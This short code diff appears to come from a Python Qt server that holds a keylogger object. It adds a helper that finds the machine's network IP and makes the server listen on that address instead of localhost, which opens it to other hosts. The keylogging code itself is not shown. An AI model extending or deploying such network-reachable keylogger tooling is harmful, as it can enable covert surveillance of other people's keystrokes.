@@ -1,3 +1,4 @@
+import socket
 from server_design import ServerDesign
 import global_variables as gv
 import sys, os, re, subprocess, winreg
@@ -10,10 +11,19 @@ class ServerApp(ServerDesign):
         super().__init__()
         self.keylogger = Keylogger()
 
+    def get_network_ip(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip_address = s.getsockname()[0]
+        s.close()
+        return ip_address
+
     def on_btn_open_server_click(self):
         if gv.server is None:
+            ip_address = self.get_network_ip()
+            print(ip_address)
             gv.server = QTcpServer(self)
-            gv.server.listen(QHostAddress("127.0.0.1"), 5656)
+            gv.server.listen(QHostAddress(ip_address), 5656)
             gv.server.newConnection.connect(self.on_new_connection)
             self.btn_open_server.setEnabled(False)
 
